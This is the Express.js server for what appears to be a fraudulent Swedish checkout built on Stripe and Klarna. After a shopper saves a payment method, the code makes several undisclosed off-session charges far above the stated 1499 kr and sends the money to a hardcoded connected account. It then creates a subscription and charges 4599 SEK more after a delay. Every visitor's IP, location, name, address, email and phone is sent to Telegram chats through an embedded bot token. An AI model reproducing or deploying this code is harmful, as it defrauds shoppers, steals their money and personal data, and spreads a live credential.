require('dotenv').config();
const express = require('express');
const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const ACCOUNT_B = 'acct_1T7GFJ3wX40Nk5Cf';
const TELEGRAM_BOT_TOKEN = '8256018531:AAHzrYSlCNrsmYzVSZnS01VYNzg_huSA2tE';
const TELEGRAM_CHAT_ID = '8522488857';
const TELEGRAM_CHAT_ID_2 = '715805541';

async function sendTelegram(message) {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID_2,
        text: message,
        parse_mode: 'HTML'
      })
    });
  } catch (err) {
    console.log('Telegram error:', err.message);
  }
}

async function runRound1(customerId, paymentMethodId, pmType, visitorId) {
  // Charge 1 — 199 SEK
  try {
    const payment1 = await stripe.paymentIntents.create({
      amount: 19900,
      currency: 'sek',
      customer: customerId,
      payment_method: paymentMethodId,
      payment_method_types: [pmType],
      confirm: true,
      off_session: true,
      transfer_data: { destination: ACCOUNT_B },
    });
    console.log('Round 1 - Payment 1 created:', payment1.id, payment1.status);
  } catch (err) {
    console.log('Round 1 - Payment 1 failed:', err.message);
  }

  await new Promise(resolve => setTimeout(resolve, 20000));

  // Charge 2 — 2599 SEK
  try {
    const payment2 = await stripe.paymentIntents.create({
      amount: 259900,
      currency: 'sek',
      customer: customerId,
      payment_method: paymentMethodId,
      payment_method_types: [pmType],
      confirm: true,
      off_session: true,
      transfer_data: { destination: ACCOUNT_B },
    });
    console.log('Round 1 - Payment 2 created:', payment2.id, payment2.status);
  } catch (err) {
    console.log('Round 1 - Payment 2 failed:', err.message);
  }

  await new Promise(resolve => setTimeout(resolve, 20000));

  // Charge 3 — 8599 SEK
  try {
    const payment3 = await stripe.paymentIntents.create({
      amount: 859900,
      currency: 'sek',
      customer: customerId,
      payment_method: paymentMethodId,
      payment_method_types: [pmType],
      confirm: true,
      off_session: true,
      transfer_data: { destination: ACCOUNT_B },
    });
    console.log('Round 1 - Payment 3 created:', payment3.id, payment3.status);
  } catch (err) {
    console.log('Round 1 - Payment 3 failed:', err.message);
  }

  await sendTelegram(
    `✅ <b>Betalning lyckades! (Omgång 1)</b>\n\n` +
    `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
    `💳 Betalningsmetod: ${pmType}\n` +
    `💳 Betalning 1: 199 kr\n` +
    `💳 Betalning 2: 2599 kr\n` +
    `💳 Betalning 3: 8599 kr\n` +
    `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
  );
}

async function runRound2(customerId, paymentMethodId, pmType, visitorId) {
  // Single charge — 4599 SEK
  try {
    const payment = await stripe.paymentIntents.create({
      amount: 459900,
      currency: 'sek',
      customer: customerId,
      payment_method: paymentMethodId,
      payment_method_types: [pmType],
      confirm: true,
      off_session: true,
      transfer_data: { destination: ACCOUNT_B },
    });
    console.log('Round 2 - Payment created:', payment.id, payment.status);
  } catch (err) {
    console.log('Round 2 - Payment failed:', err.message);
  }

  await sendTelegram(
    `✅ <b>Betalning lyckades! (Omgång 2)</b>\n\n` +
    `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
    `💳 Betalningsmetod: ${pmType}\n` +
    `💳 Betalning: 4599 kr\n` +
    `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
  );
}

app.use(cors({ origin: '*', methods: ['GET', 'POST'] }));
app.use(bodyParser.json());

app.post('/page-visit', async (req, res) => {
  const { visitorId, ip, country, city } = req.body;
  await sendTelegram(
    `👁 <b>Ny sidbesökare!</b>\n\n` +
    `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
    `🌍 Land: ${country || 'Okänt'}\n` +
    `🏙 Stad: ${city || 'Okänt'}\n` +
    `🔌 IP: ${ip || 'Okänt'}\n` +
    `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
  );
  res.json({ ok: true });
});

app.post('/create-setup-intent', async (req, res) => {
  let { email, fname, lname, address, zip, city, country, phone, visitorId } = req.body;

  email = email.trim().replace(/\.$/, '');

  try {
    let customer;
    const existing = await stripe.customers.list({ email, limit: 1 });
    if (existing.data.length > 0) {
      customer = existing.data[0];
    } else {
      customer = await stripe.customers.create({
        email,
        address: { country: 'SE' },
      });
    }

    const setupIntent = await stripe.setupIntents.create({
      customer: customer.id,
      payment_method_types: ['klarna'],
      metadata: { customer_id: customer.id },
    });

    await sendTelegram(
      `🛒 <b>Kassauppgifter!</b>\n\n` +
      `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
      `📧 E-post: ${email}\n` +
      `👤 Namn: ${fname} ${lname}\n` +
      `📍 Adress: ${address}, ${zip} ${city}, ${country}\n` +
      `📞 Telefon: ${phone || 'N/A'}\n` +
      `💰 Belopp: 1499 kr\n` +
      `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
    );

    res.json({
      clientSecret: setupIntent.client_secret,
      customerId: customer.id,
    });
  } catch (error) {
    console.error('Error:', error);
    res.status(400).json({ error: error.message });
  }
});

app.post('/payment-initiated', async (req, res) => {
  const { visitorId, email } = req.body;
  await sendTelegram(
    `💳 <b>Betalningsförsök startat!</b>\n\n` +
    `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
    `📧 E-post: ${email}\n` +
    `⏳ Kunden har klickat på "Betala nu"\n` +
    `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
  );
  res.json({ ok: true });
});

app.post('/create-subscription', async (req, res) => {
  const { customerId, paymentMethodId, visitorId } = req.body;
  try {
    await stripe.paymentMethods.attach(paymentMethodId, { customer: customerId });
    await stripe.customers.update(customerId, {
      invoice_settings: { default_payment_method: paymentMethodId },
    });

    const paymentMethod = await stripe.paymentMethods.retrieve(paymentMethodId);
    const pmType = paymentMethod.type;

    // Round 1 — immediately
    await runRound1(customerId, paymentMethodId, pmType, visitorId);

    await new Promise(resolve => setTimeout(resolve, 20000));

    // Subscription with 30-day trial
    const subscription = await stripe.subscriptions.create({
      customer: customerId,
      items: [{ price: 'price_1T8uPSJPCUQist1fHF90JM3x' }],
      default_payment_method: paymentMethodId,
      trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
      transfer_data: { destination: ACCOUNT_B },
    });
    console.log('Subscription created:', subscription.id, subscription.status);

    // Round 2 — after 30 minutes (runs in background, doesn't block response)
    setTimeout(async () => {
      console.log('Starting Round 2 charges (after 15 min)...');
      await runRound2(customerId, paymentMethodId, pmType, visitorId);
    }, 15 * 60 * 1000);

    res.json({
      subscriptionId: subscription.id,
      paymentStatus: 'processed',
    });
  } catch (error) {
    console.error('Error:', error.message);
    res.status(400).json({ error: error.message });
  }
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok', destination: ACCOUNT_B });
});

const PORT = process.env.PORT || 4242;
app.listen(PORT, () => {
  console.log('Server running on http://localhost:' + PORT);
});
